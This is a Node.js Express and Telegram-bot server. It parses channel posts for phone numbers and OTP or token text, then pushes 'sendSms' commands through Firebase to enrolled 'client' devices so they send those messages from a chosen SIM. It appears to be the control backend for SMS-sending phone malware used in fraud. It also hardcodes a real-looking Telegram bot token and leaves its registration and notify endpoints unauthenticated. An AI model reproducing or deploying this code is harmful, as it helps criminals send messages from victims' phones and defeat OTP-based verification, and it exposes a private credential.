const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { Telegraf } = require('telegraf');

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = '8928344876:AAHhu5s2eAsfIQmOLjdjuwy_-JRD0fruwNA';
const DATA_FILE = path.join(__dirname, 'data.json');

let store = { users: {} };
let processed = new Set();
let cfgCache = {};
const CFG_TTL = 30000;
const CFG_REFRESH_INTERVAL = 45000;

function load() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            store = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
        }
    } catch (e) { console.error('Load error:', e.message); }
}

function save() {
    try {
        fs.writeFileSync(DATA_FILE, JSON.stringify(store, null, 2));
    } catch (e) { console.error('Save error:', e.message); }
}

load();

const app = express();
app.use(express.json());
app.use(express.static(__dirname));

app.get('/', function (req, res) {
    const p = path.join(__dirname, 'panel.html');
    if (fs.existsSync(p)) res.sendFile(p);
    else res.send('panel.html missing');
});

app.post('/api/register', function (req, res) {
    const u = req.body.firebaseUrl;
    if (!u) return res.status(400).json({ error: 'missing url' });
    const clean = u.replace(/\/$/, '');
    store.users[clean] = store.users[clean] || {};
    store.users[clean].registeredAt = Date.now();
    save();
    
    refreshCfg(clean).then(function(cfg) {
        console.log('Registered & config loaded:', clean);
    }).catch(function() {
        console.log('Registered (config pending):', clean);
    });
    
    res.json({ ok: true });
});

app.get('/api/status', function (req, res) {
    res.json({ 
        ok: true, 
        users: Object.keys(store.users).length,
        cached: Object.keys(cfgCache).length
    });
});

app.post('/api/notify-channel', async function (req, res) {
    try {
        const channel = req.body.channel;
        const action = req.body.action;
        const sim = req.body.sim || 0;
        const deviceName = req.body.deviceName || 'Unknown';
        const firebaseUrl = req.body.firebaseUrl;
        
        if (!channel) return res.json({ ok: false, error: 'no channel' });
        
        const msg = action === 'on' 
            ? ('✅ Token CHALU\n📱 Device: ' + deviceName + '\n📶 SIM: ' + (sim + 1))
            : ('❌ Token BAND\n📱 Device: ' + deviceName);
        
        await bot.telegram.sendMessage(channel, msg);
        
        if (firebaseUrl) {
            await refreshCfg(firebaseUrl.replace(/\/$/, ''));
        }
        
        const users = Object.keys(store.users);
        for (const u of users) {
            await refreshCfg(u).catch(function() {});
        }
        
        res.json({ ok: true });
    } catch (e) {
        console.error('notify-channel error:', e.message);
        res.json({ ok: false, error: e.message });
    }
});

app.listen(PORT, '0.0.0.0', function () {
    console.log('Server running on port ' + PORT);
    Object.keys(store.users).forEach(function(u) {
        refreshCfg(u).catch(function() {});
    });
});

async function fbGet(url, p) {
    try {
        const r = await axios.get(
            url.replace(/\/$/, '') + '/' + p + '.json',
            { timeout: 10000 }
        );
        return r.data;
    } catch (e) {
        return null;
    }
}

async function fbPut(url, p, data) {
    try {
        const r = await axios.put(
            url.replace(/\/$/, '') + '/' + p + '.json',
            data,
            { timeout: 10000 }
        );
        return r.status === 200;
    } catch (e) {
        return false;
    }
}

function getCfg(u) {
    const c = cfgCache[u];
    if (c && (Date.now() - c.at) < CFG_TTL) return c.cfg;
    return null;
}

function refreshCfg(u) {
    return fbGet(u, 'bot_config')
        .then(function (cfg) {
            cfgCache[u] = { cfg: cfg, at: Date.now() };
            return cfg;
        })
        .catch(function () {
            return null;
        });
}

setInterval(function () {
    Object.keys(store.users).forEach(function (u) {
        refreshCfg(u).catch(function() {});
    });
}, CFG_REFRESH_INTERVAL);

const bot = new Telegraf(BOT_TOKEN);

function extract(text) {
    if (!text) return null;
    
    var patterns = [
        /To\s*(?:\(Tap to copy\))?\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
        /Receipt\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
        /Number\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
        /Phone\s*[:\-]?[\s\n]*\+?(\d{10,12})/i,
        /Mobile\s*[:\-]?[\s\n]*\+?(\d{10,12})/i
    ];
    
    var number = null;
    for (var i = 0; i < patterns.length; i++) {
        var m = text.match(patterns[i]);
        if (m) { number = m[1]; break; }
    }
    if (!number) return null;
    
    var bodyPatterns = [
        /Body\s*(?:\(Tap to copy\))?\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /Message\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /Msg\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /Token\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /OTP\s*[:\-]?[\s\n]*([\s\S]+)/i,
        /Code\s*[:\-]?[\s\n]*([\s\S]+)/i
    ];
    
    var message = null;
    for (var j = 0; j < bodyPatterns.length; j++) {
        var b = text.match(bodyPatterns[j]);
        if (b && b[1]) {
            message = b[1].replace(/^[\s\n\r]+/, '').replace(/[\s\n\r]+$/, '');
            if (message) break;
        }
    }
    if (!message) return null;
    
    return { number: number, message: message };
}

function cleanNumber(num) {
    return String(num).trim();
}

bot.on('channel_post', async function (ctx) {
    const start = Date.now();
    const text = ctx.channelPost.text || ctx.channelPost.caption || '';
    const chatId = ctx.chat.id.toString();
    const msgId = ctx.channelPost.message_id;
    
    if (!text) return;
    
    console.log('\n=== NEW MSG ===');
    console.log('Chat:', chatId, 'MsgId:', msgId);
    console.log('Text:', JSON.stringify(text.slice(0, 200)));
    
    const tok = extract(text);
    if (!tok) {
        console.log('No token extracted');
        return;
    }
    
    const globalKey = chatId + '_' + msgId;
    if (processed.has(globalKey)) {
        console.log('Duplicate, skipping');
        return;
    }
    processed.add(globalKey);
    
    if (processed.size > 5000) {
        processed = new Set(Array.from(processed).slice(-2000));
    }
    
    console.log('Extracted number:', tok.number);
    console.log('Extracted message:', JSON.stringify(tok.message.slice(0, 100)));
    
    const urls = Object.keys(store.users);
    console.log('Checking', urls.length, 'users');
    
    for (const fbUrl of urls) {
        try {
            let cfg = getCfg(fbUrl);
            if (!cfg) {
                cfg = await refreshCfg(fbUrl);
            }
            
            if (!cfg) {
                console.log('No config for', fbUrl);
                continue;
            }
            
            if (!cfg.channels || cfg.channels.indexOf(chatId) === -1) {
                continue;
            }
            
            let targetDevice = null;
            let simSlot = 0;
            
            if (cfg.devices && typeof cfg.devices === 'object') {
                const enabledDevices = Object.entries(cfg.devices)
                    .filter(([id, d]) => d && d.enabled === true);
                
                if (enabledDevices.length > 0) {
                    targetDevice = enabledDevices[0][0];
                    simSlot = enabledDevices[0][1].simSlot != null ? enabledDevices[0][1].simSlot : 0;
                }
            }
            
            if (!targetDevice && cfg.tokenEnabled && cfg.tokenDevice) {
                targetDevice = cfg.tokenDevice;
                simSlot = cfg.tokenSim || 0;
            }
            
            if (!targetDevice) {
                continue;
            }
            
            const clean = cleanNumber(tok.number);
            const ts = Date.now();
            
            console.log('Sending to device:', targetDevice, 'SIM:', simSlot);
            
            await fbPut(fbUrl, 'clients/' + targetDevice + '/webhookEvent/sendSms', {
                to: clean,
                message: tok.message,
                isSended: false,
                timestamp: ts,
                commandId: 'tk_' + ts + '_' + Math.random().toString(36).slice(2, 8),
                simInfo: { simSlot: simSlot },
                fromToken: true
            });
            
            const elapsed = Date.now() - start;
            const reply = '✅ SMS Bhej diya\n\n' +
                '📱 Device: ' + targetDevice + '\n' +
                '📞 To: ' + clean + '\n' +
                '📶 SIM: ' + (simSlot + 1) + '\n' +
                '⚡ Time: ' + elapsed + 'ms\n\n' +
                '📝 Body:\n' + tok.message;
            
            await bot.telegram.sendMessage(chatId, reply, {
                reply_to_message_id: msgId
            }).catch(function(e) { console.log('Reply error:', e.message); });
            
            console.log('✅ Sent to', clean, 'in', elapsed + 'ms');
            
        } catch (e) {
            console.error('Error processing', fbUrl, ':', e.message);
        }
    }
});

bot.command('id', function (ctx) {
    ctx.reply('ID: ' + ctx.from.id + '\nChat: ' + ctx.chat.id);
});

bot.command('start', function (ctx) {
    ctx.reply('ANANYA Bot Active');
});

bot.command('status', function (ctx) {
    const users = Object.keys(store.users);
    ctx.reply('Users: ' + users.length + '\nCached: ' + Object.keys(cfgCache).length);
});

bot.launch()
    .then(function () {
        console.log('✅ Bot started');
        Object.keys(store.users).forEach(function (u) {
            refreshCfg(u).catch(function() {});
        });
    })
    .catch(function (e) {
        console.log('❌ Bot error:', e.message);
    });

process.once('SIGINT', function() { bot.stop('SIGINT'); });
process.once('SIGTERM', function() { bot.stop('SIGTERM'); });
